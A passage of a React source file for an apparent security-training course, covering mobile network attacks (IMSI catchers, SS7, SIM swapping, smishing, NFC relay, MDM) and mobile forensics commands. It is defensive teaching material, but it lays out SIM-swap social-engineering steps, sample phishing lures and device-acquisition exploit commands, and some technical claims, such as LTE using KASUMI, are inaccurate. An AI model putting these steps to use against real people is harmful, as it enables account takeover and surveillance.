        <Note type="danger">Analysing mobile malware in a live environment risks self-infection or triggering C2 callbacks that could be attributed to you. Always use isolated networks (no internet, or monitored network), dedicated analysis devices, and document your authorisation to possess the malware sample. In many jurisdictions, possessing malware without authorisation is itself illegal.</Note>
      </div>
    ),
  },

  // ─── CHAPTER 8 ───────────────────────────────────────────────────────────────
  {
    id: 'mob-08',
    title: 'Mobile Network Attacks',
    difficulty: 'ADVANCED',
    readTime: '15 min',
    labLink: '/modules/mobile-security/lab',
    takeaways: [
      'IMSI catchers force 2G downgrade (no mutual authentication) to intercept calls and SMS - defeating SIM-based MFA at the protocol layer',
      'SS7 vulnerabilities allow tracking any phone globally using only a phone number - they exist in the signalling protocol itself, not in devices or apps',
      'SIM swapping is the most practical attack on phone-number-based MFA and requires only social engineering skills against carrier support staff',
      'NFC relay attacks on contactless payments can be performed from metres away using two Android devices running relay software',
      'MDM enrollment token theft and MDM payload injection can give an attacker full control over enrolled corporate mobile devices',
    ],
    content: (
      <div>
        <P>Mobile network attacks target the telecommunications infrastructure that devices depend on, rather than the applications running on them. These attacks can bypass app-level security completely, which is why security-conscious apps cannot rely on phone number as a second factor.</P>

        <H3>IMSI Catchers (Stingrays)</H3>
        <P>An IMSI catcher (also called a Stingray, ISSI, or fake base station) impersonates a legitimate cell tower. Mobile devices connect to the strongest signal - so an attacker with a high-powered transmitter causes nearby phones to connect to their fake tower instead of the real one.</P>
        <Pre label="// IMSI CATCHER ATTACK MECHANICS">{`# How it works:
# 1. Attacker sets up fake base station broadcasting in 2G (GSM)
# 2. Forces nearby phones to downgrade from 4G/5G to 2G
#    (phones always prefer the strongest signal regardless of generation)
# 3. In 2G/GSM: only the network authenticates to the phone, NOT vice versa
#    (mutual authentication only exists in 3G/4G via AKA protocol)
# 4. IMSI (International Mobile Subscriber Identity) sent by phone unencrypted
#    during initial attach - captured by attacker
# 5. Call content and SMS traffic can be decrypted (GSM A5/1 cipher is broken)

# IMSI = unique 15-digit identifier for your SIM card
# With IMSI: track location, correlate to identity, intercept communications

# Detection of IMSI catchers:
# Android IMSA catcher detector apps: AIMSICD (open source)
# Check for: sudden 2G downgrade, unusually strong signal, unexpected LAC changes
# Commercial solutions: SITCH sensor, ESD America Guardian

# Defence: use Signal/WhatsApp (encrypted at app layer, 2G IMSI capture
# cannot decrypt Signal traffic - they get metadata but not content)

# 5G improvement: 5G encrypts the IMSI (called SUPI -> SUCI on air interface)
# But IMSI catchers can still force 4G fallback where IMSI is less protected`}</Pre>

        <H3>SS7 Attacks</H3>
        <P>SS7 (Signaling System 7) is the protocol suite that telecommunications networks use to exchange information - routing calls, SMS, and enabling roaming. It was designed in 1975 with zero security (all operators were assumed trusted). Today, access to SS7 can be purchased on the dark web for a few hundred dollars.</P>
        <Pre label="// SS7 ATTACK CAPABILITIES">{`# What SS7 access allows:
# 1. Location tracking: send SRI-SM (Send Routing Info for SM) to locate subscriber
#    - Returns: VLR address (tells you which city/area the phone is in)
#    - PSI (Provide Subscriber Info): more precise location
#    - Used commercially by FlexiSpy, mSpy location APIs

# 2. SMS interception: register a fake MSC, redirect SMS to attacker
#    - Register fake MSC in HLR (Home Location Register)
#    - Target's SMS OTPs are delivered to attacker first
#    - COMPLETELY defeats SMS-based MFA (banking, cryptocurrency)
#    - Note: this requires actual SS7 access, not trivial

# 3. Call interception: CAMEL protocol abuse, call divert injection
#    - Inject a call divert to forward calls to attacker's line

# Research tools:
# SigPloit: https://github.com/SigPloiter/SigPloit
# MAP (Mobile Application Part) protocol fuzzer

# Defence: do NOT use SMS for MFA on high-value accounts
# Use: FIDO2/WebAuthn, TOTP authenticator apps, hardware tokens (YubiKey)
# Banks that mandate SMS OTP are vulnerable to this attack`}</Pre>

        <H3>SIM Swapping</H3>
        <Pre label="// SIM SWAP ATTACK FLOW">{`# SIM swap = convincing a mobile carrier to transfer a victim's
# phone number to a SIM card controlled by the attacker

# Attack flow:
# 1. Gather target information (OSINT): name, address, DOB, last 4 of SSN
#    Sources: data breaches, LinkedIn, social media, people-search sites
# 2. Call carrier customer support (or visit in-store)
# 3. Impersonate the victim: provide gathered information
# 4. Request SIM swap: "I got a new phone, please transfer my number"
# 5. Carrier rep processes transfer (if verification is weak)
# 6. Victim loses service, attacker receives all SMS and calls on their SIM

# Impact: bypasses ALL phone-number-based MFA
# - Bank account takeover via SMS OTP
# - Cryptocurrency exchange takeover
# - Gmail/Apple ID takeover via phone recovery

# Defence for users: ask carrier to add SIM swap PIN/passcode, use FIDO2
# Defence for high-risk users: Google Fi Advanced Protection, carrier SIM lock
# Defence for companies: never use SMS MFA, use TOTP or hardware tokens`}</Pre>

        <H3>4G LTE Security</H3>
        <Pre label="// LTE SECURITY MODEL AND ATTACKS">{`# LTE security improvements over 2G/3G:
# - AKA (Authentication and Key Agreement): mutual authentication
# - KASUMI cipher: 128-bit key (stronger than GSM's A5/1)
# - Separate keys for signalling and user data (C-plane / U-plane)

# Remaining LTE attack surfaces:
# - Airtight protocol vulnerabilities: LTEInspector (Purdue University research)
#   Found 10 new vulnerabilities including fake emergency alerts, call disruption
# - RACH (Random Access Channel) spoofing
# - Paging channel attacks: identify presence of target device

# LTEInspector tool: https://github.com/relentless-pursuit/LTEInspector
# Requires: LTE test equipment (USRP/srsRAN) + specialist knowledge

# 5G security improvements:
# - SUPI/SUCI: IMSI encrypted on the air interface
# - 256-bit keys: resistant to quantum computing attacks (future-proofing)
# - Network slicing security: logical isolation between slices
# - SEPP (Security Edge Protection Proxy): replaces SS7 for inter-carrier traffic
# Remaining issues: legacy fallback vulnerabilities, deployment misconfigurations`}</Pre>

        <H3>Mobile Phishing (Smishing and QR)</H3>
        <Pre label="// MOBILE PHISHING TECHNIQUES">{`# Smishing (SMS phishing):
# - "Your package could not be delivered. Track here: BIT.LY/XXXXX"
# - "BANK SECURITY ALERT: Unusual activity. Verify: PHISHING_URL"
# - Short links hide the real domain - critical on mobile where URL bar is small

# WhatsApp phishing:
# - Fake WhatsApp Web login pages
# - Group invite links to malicious sites
# - Forwarded messages with phishing links (spread virally)

# QR code phishing (Quishing):
# - Replace legitimate QR codes (menus, parking, payments) with malicious ones
# - Attackers print stickers with their own QR code and paste over real ones
# - Particularly effective at parking meters, restaurants, cryptocurrency ATMs
# - Defence: inspect URL before opening, use QR scanner that shows URL first

# SMS OTP theft via smishing:
# - "Your bank needs to verify your identity. Your OTP is: [attacker triggers OTP]
#    Please confirm by replying with the OTP you received"
# - Or: link to fake bank login that forwards credentials and OTP in real time`}</Pre>

        <H3>NFC Relay Attacks</H3>
        <Pre label="// NFC RELAY ATTACK ON CONTACTLESS PAYMENTS">{`# NFC relay attack: relay the NFC communication between a victim's
# payment card (or Apple/Google Pay) and a real payment terminal
# Two devices: one near victim (reads card), one at merchant (replays)

# Tools: NFCGate (Android)
# https://github.com/nfcgate/nfcgate
# Requires: two Android devices with NFC, host relay server

# Attack flow:
# Device A: placed near victim's wallet/pocket, reads card NFC
# Server: relays EMV protocol messages in real time
# Device B: at payment terminal, replays card responses -> payment authorised

# Limitations:
# - Distance: NFC reader on Device A must be within a few cm of victim's card
# - Dynamic CVV: Visa/Mastercard generate dynamic CVV per transaction
#   (this limits replay attacks but relay attacks bypass this)
# - Distance-bounding protocols: some payment systems measure roundtrip time
#   to detect relay attacks (not widely deployed)

# Apple Pay / Google Pay security:
# - Tokenisation: replaces real card number with device-specific token
# - Dynamic cryptogram: per-transaction cryptogram from Secure Enclave
# - Biometric authentication: Face ID/fingerprint required (on device)
# - This significantly raises the bar vs physical card relay`}</Pre>

        <H3>MDM (Mobile Device Management) Security</H3>
        <Pre label="// MDM ATTACK SURFACE">{`# MDM architecture:
# MDM server (Intune, Jamf, VMware Workspace ONE) -> device
# Communication over MDM protocol (HTTP-based, APNs for push commands)

# Attack vectors:

# 1. MDM enrollment bypass
# Corporate BYOD: employee registers personal device
# Attacker registers a malicious device using stolen credentials
# Gets corporate email, VPN profile, WiFi config, apps pushed automatically

# 2. MDM enrollment token theft
# Enrollment tokens (DEP profile URLs) sent via email
# If attacker intercepts the email during provisioning -> enroll their device

# 3. MDM payload injection (MitM during enrollment)
# If MDM server uses HTTP or has weak TLS during enrollment:
# Inject malicious profile with VPN config routing all traffic to attacker

# 4. Compromised MDM server
# If MDM console credentials are weak or stolen:
# Push malicious app to all enrolled devices
# Force passcode removal on supervised devices
# Wipe devices (destructive)

# Defence:
# - Require certificate-based authentication for MDM enrollment
# - Use DEP (Device Enrollment Program) - hardware-bound enrollment
# - Enable MDM server MFA
# - Monitor MDM for new enrollments, configuration changes
# - BYOD: use work profile (Android) or managed apps (iOS), not full MDM`}</Pre>

        <Note type="warn">SS7 attacks and IMSI catcher deployment require specialised hardware and telecom network access. In most jurisdictions these are restricted to law enforcement with a warrant. This material is presented for understanding mobile threat models and developing appropriate defences - do not attempt to deploy these capabilities without authorisation.</Note>
      </div>
    ),
  },

  // ─── CHAPTER 9 ───────────────────────────────────────────────────────────────
  {
    id: 'mob-09',
    title: 'Mobile Forensics & Incident Response',
    difficulty: 'ADVANCED',
    readTime: '15 min',
    labLink: '/modules/mobile-security/lab',
    takeaways: [
      'Logical acquisition extracts app data, messages, and media via ADB or iTunes backup; physical acquisition requires device unlock or hardware exploit and gets everything including deleted data',
      'iOS physical acquisition without passcode requires either Checkm8 hardware exploit (A5-A11 only) or commercial tools like GrayKey - most locked modern iPhones cannot be physically acquired',
      'SQLite WAL journal and freelist pages preserve deleted records after standard deletion - forensic tools can recover months of deleted messages, location history, and photos',
      'MVT (Mobile Verification Toolkit) is the correct tool for incident response when spyware is suspected - it compares device artifacts against known IOC databases',
      'Factory reset does NOT securely erase flash storage - remnant data in unallocated blocks can be recovered; secure erase requires cryptographic erasure (AES key destruction)',
    ],
    content: (
      <div>
        <P>Mobile forensics is the science of extracting and analysing data from mobile devices for incident response, legal proceedings, and threat investigations. This chapter covers both the acquisition methods available and the key artifacts that are most forensically valuable.</P>

        <H3>Android Forensic Acquisition</H3>
        <Table
          headers={['Method', 'Access Required', 'Data Available', 'Tools']}
          rows={[
            ['Logical (ADB)', 'USB debugging enabled', 'App data (debuggable apps), media, backups', 'adb, ADB Extractor'],
            ['ADB Backup', 'USB debugging, unlocked screen', 'App data from backup-enabled apps', 'adb backup, ABE'],
            ['Physical (root)', 'Root access', 'Full filesystem, all app data, deleted files', 'TWRP dd, adb pull /'],
            ['Chip-off', 'Physical lab access', 'Raw NAND flash including deleted data', 'Cellebrite, MSAB XRY'],
            ['JTAG', 'Physical lab + board access', 'NAND flash content', 'Hardware forensic labs'],
            ['EDL mode', 'Qualcomm device', 'Full flash dump without root', 'QPST, Cellebrite'],
          ]}
        />
        <Pre label="// ANDROID LOGICAL ACQUISITION">{`# ADB-based logical acquisition
# Enable USB debugging: Settings -> Developer Options -> USB Debugging
# Unlock screen (required for most acquisition)

# List apps and pull data
adb shell pm list packages -3 > installed_apps.txt
adb pull /sdcard/ ./sd_card_dump/
adb pull /data/media/ ./media_dump/     # requires root

# ADB backup (pre-Android 12, now deprecated but still works on some devices)
adb backup -all -apk -shared -nosystem -f full_backup.ab

# Extract ADB backup to readable format
java -jar abe.jar unpack full_backup.ab backup_extracted.tar
tar xvf backup_extracted.tar

# Logical acquisition on rooted device
adb shell su -c "dd if=/dev/block/mmcblk0 of=/sdcard/full_image.img"
adb pull /sdcard/full_image.img .
# Then analyse with Autopsy, FTK Imager, or sleuthkit`}</Pre>

        <H3>iOS Forensic Acquisition</H3>
        <Pre label="// iOS ACQUISITION METHODS">{`# Method 1: iTunes/iCloud backup (no jailbreak, no unlock needed)
# iCloud backup: auto if enabled - law enforcement can subpoena Apple
# iTunes backup: encrypted backup contains keychain, unencrypted does not
# idevicebackup2 (libimobiledevice):
idevicebackup2 backup --full ./ios_backup/

# Decrypt encrypted iTunes backup
python3 iphone-backup-decrypt.py BACKUP_PATH PASSWORD OUTPUT_PATH

# Method 2: BFU (Before First Unlock) acquisition
# Before passcode entered after restart: very limited data available
# AFU (After First Unlock): more data accessible (keys in memory)
# Cellebrite/GrayKey exploit BFU/AFU state differences

# Method 3: Checkm8 / Checkra1n (A5-A11 chips only)
# Hardware bootrom exploit - unpatchable
# Allows: full filesystem access, keychain, all app data
checkra1n -c    # Command line mode on connected device

# Method 4: GrayKey (commercial, law enforcement only)
# Proprietary hardware box + iOS exploits
# Cost: approx $15,000-$30,000 depending on model
# Capabilities: unlock PINs via brute force or exploit, full acquisition

# Key iOS forensic artifact locations (post-acquisition):
# /private/var/mobile/Library/SMS/sms.db       - iMessages, SMS
# /private/var/mobile/Library/AddressBook/      - Contacts
# /private/var/mobile/Library/CallHistoryDB/    - Call logs
# /private/var/mobile/Applications/             - App data
# /private/var/Keychains/keychain-2.db          - Keychain`}</Pre>

        <H3>SQLite Forensics</H3>
        <Pre label="// SQLITE DATABASE FORENSICS">{`# SQLite is used by virtually every mobile app for structured data
# Key forensic features of SQLite:

# 1. WAL (Write-Ahead Log) journal
# Changes are written to -wal file before committed to main DB
# If app crashes or DB not checkpointed: deleted data in WAL
ls *.db *.db-wal *.db-shm

# 2. Freelist pages: SQLite marks deleted pages as "free" but doesn't zero them
# Forensic tools can read these pages to recover deleted records

# SQLite analysis tools
sqlite3 sms.db
.tables
.schema message
SELECT rowid, text, date, handle_id FROM message ORDER BY date DESC LIMIT 50;

# Recover deleted records with Epilog or sqlite-dissect
pip install sqlite-dissect
sqlite_dissect sms.db --output ./analysis/

# Manual freelist recovery with sqlparse
# or commercial: Belkasoft Evidence Center, Magnet AXIOM

# Android SMS database location:
# /data/data/com.android.providers.telephony/databases/mmssms.db
# iOS SMS database:
# /private/var/mobile/Library/SMS/sms.db`}</Pre>

        <H3>Key Artifact Locations</H3>
        <Pre label="// ANDROID FORENSIC ARTIFACT LOCATIONS">{`# SMS / MMS
/data/data/com.android.providers.telephony/databases/mmssms.db

# Contacts
/data/data/com.android.providers.contacts/databases/contacts2.db

# Call logs (part of contacts database in modern Android)
/data/data/com.android.providers.contacts/databases/contacts2.db
# Table: calls

# Browser history (Chrome)
/data/data/com.android.chrome/app_chrome/Default/History

# Gmail cache
/data/data/com.google.android.gm/databases/

# WhatsApp messages
/data/data/com.whatsapp/databases/msgstore.db
# Note: WhatsApp messages are end-to-end encrypted, but local DB may be
# encrypted with the device-derived key (recoverable with root)

# Signal messages
/data/data/org.thoughtcrime.securesms/databases/signal.db
# Signal uses SQLCipher encryption with a random key - very hard to decrypt
# Even with root: key stored in secure memory, not on filesystem

# Location history (Google)
/data/data/com.google.android.gms/databases/`}</Pre>

        <H3>Android Encryption</H3>
        <Pre label="// ANDROID ENCRYPTION - FDE vs FBE">{`# FDE (Full Disk Encryption) - Android 5.0-9 (legacy)
# Entire userdata partition encrypted with single key
# Key derived from: device key + passcode
# Problem: device must be decrypted at boot (requires passcode entry)
# Forensically: get passcode or brute-force key

# FBE (File-Based Encryption) - Android 9+ default
# Different files encrypted with different keys:
# Credential Encrypted (CE) storage: decrypted after passcode entry
# Device Encrypted (DE) storage: available before passcode (limited data)
# More granular, supports Direct Boot mode

# Keystore: hardware-backed key storage (Strongbox in Android 9+)
# Keys generated in hardware, never exported to software
# Forensic impact: keys locked to device hardware, cannot be extracted
# even with NAND chip-off - need device itself AND passcode`}</Pre>

        <H3>MVT for Incident Response</H3>
        <Pre label="// MVT FULL WORKFLOW">{`# Install
pip install mvt

# Update IOC databases
# Download latest IOCs from Amnesty International and Citizen Lab:
# https://github.com/AmnestyTech/investigations
# https://github.com/citizenlab/malware-indicators

# Android investigation via ADB
mvt-android check-adb \
  --iocs /path/to/iocs/ \
  --output /path/to/output/

# Android backup investigation
adb backup -all -f device_backup.ab
mvt-android check-backup \
  --iocs /path/to/iocs/ \
  --output /path/to/output/ \
  /path/to/device_backup.ab

# iOS investigation from encrypted backup
mvt-ios decrypt-backup \
  -p BACKUP_PASSWORD \
  /path/to/encrypted_backup/
mvt-ios check-backup \
  --iocs /path/to/iocs/ \
  --output /path/to/output/ \
  /path/to/decrypted_backup/

# Review output:
# DETECTED/ directory: positive IOC matches (high confidence)
# timeline.csv: full activity timeline sorted by timestamp
# Look for: process executions around exploit window,
#   unusual network connections, deleted database entries`}</Pre>

        <H3>Factory Reset and Data Recovery</H3>
        <Pre label="// FACTORY RESET FORENSICS">{`# Factory reset on Android:
# - Marks userdata partition as available for reuse (does NOT zero)
# - On eMMC/UFS flash: wear leveling means data may persist in old blocks
# - Forensic tools (Cellebrite UFED) can sometimes recover post-reset

# Secure erase:
# - Cryptographic erasure: destroy the encryption key (most effective)
# - Android 5+: "Encrypt then factory reset" ensures unrecoverable wipe
#   Settings -> Security -> Encryption -> Encrypt Device -> then Factory Reset
# - The AES key is destroyed; ciphertext remains but is computationally irreversible

# iOS:
# "Erase All Content and Settings": destroys the file system key (UID key)
# This is cryptographic erasure - data is unrecoverable without the key
# Takes seconds because it just destroys the key, not the data

# Anti-forensics tools (for awareness, not endorsement):
# - Secure delete apps: overwrite specific files
# - Encrypted containers: limited by OS restrictions on mobile
# - Signal: auto-delete timers, disappearing messages
# - These help but are not foolproof against physical acquisition`}</Pre>

        <H3>Cloud-Linked Mobile Forensics</H3>
        <Pre label="// CLOUD DATA IN MOBILE INVESTIGATIONS">{`# iCloud evidence:
# - Backups: contacts, messages, photos, app data (if backup enabled)
# - iCloud Drive: documents, desktop files
# - iCloud Photos: full photo library with EXIF and location
# - Find My: location history
# Law enforcement: legal process (warrant) to Apple for preservation/production

# Google Account:
# - Google Takeout: user can export all data (location, searches, YouTube, mail)
# - Google Location History: detailed GPS timeline
# - Google Photos: full photo library
# - Gmail: full email content
# Law enforcement: legal process to Google

# Samsung Cloud (Samsung devices):
# - Device backup (contacts, apps, settings)
# - Samsung Health data (biometrics, exercise)

# WhatsApp cloud backup:
# - Android: WhatsApp backup stored in Google Drive
# - iOS: WhatsApp backup stored in iCloud
# - Not end-to-end encrypted by default (was changed in 2021 - optional E2E)
# - If unencrypted: Google/Apple can provide backup to law enforcement`}</Pre>

        <Note type="tip">For a complete mobile forensics practice environment, consider SANS FOR585 Smartphone Forensics course material, which includes sample device images for analysis. For open-source practice, create test Android backups with known content and practice MVT analysis and SQLite recovery on your own data.</Note>
      </div>
    ),
  },
]

export default function MobileSecurity() {
  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: mono, fontSize: '0.7rem', color: '#5a3a8a' }}>
        <Link href="/" style={{ color: '#5a3a8a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>MOD-13 // MOBILE SECURITY</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: 'rgba(124,77,255,0.08)', border: '1px solid rgba(124,77,255,0.3)', borderRadius: '3px', color: accent, fontSize: '8px' }}>CONCEPT</span>
          <Link href="/modules/mobile-security/lab" style={{ textDecoration: 'none', padding: '3px 10px', background: 'rgba(124,77,255,0.1)', border: '1px solid rgba(124,77,255,0.5)', borderRadius: '3px', color: accent, fontSize: '8px', letterSpacing: '0.15em', fontWeight: 700 }}>LAB &#8594;</Link>
        </div>
      </div>

      {/* Hero */}
      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: mono, fontSize: '9px', color: '#4a3a6a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>MODULE 13 &middot; CONCEPT PAGE</div>
        <h1 style={{ fontFamily: mono, fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: 'rgba(124,77,255,0.35) 0 0 20px' }}>MOBILE SECURITY</h1>
        <p style={{ color: '#5a3a8a', fontFamily: mono, fontSize: '0.75rem' }}>
          Android APK analysis &middot; iOS security model &middot; Frida instrumentation &middot; SSL unpinning &middot; Drozer &middot; MobSF &middot; ADB &middot; OWASP Mobile Top 10 &middot; Malware analysis &middot; SS7 attacks &middot; Mobile forensics &middot; MVT spyware detection
        </p>
      </div>

      {/* Module nav - prev/next */}
      <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '2.5rem' }}>
        <Link href="/modules/wireless-attacks" style={{
          fontFamily: mono, fontSize: '0.7rem', color: '#5a3a8a', textDecoration: 'none',
          padding: '6px 14px', border: '1px solid #200040', borderRadius: '4px',
          background: 'rgba(124,77,255,0.04)', transition: 'all 0.15s'
        }}>
          &#8592; MOD-12: WIRELESS ATTACKS
        </Link>
        <span style={{ fontFamily: mono, fontSize: '0.65rem', color: '#2a1a4a', alignSelf: 'center' }}>MOD-13 of 13</span>
      </div>

      {/* Codex */}
      <ModuleCodex moduleId="mobile-security" accent={accent} chapters={chapters} />
    </div>
  )
}
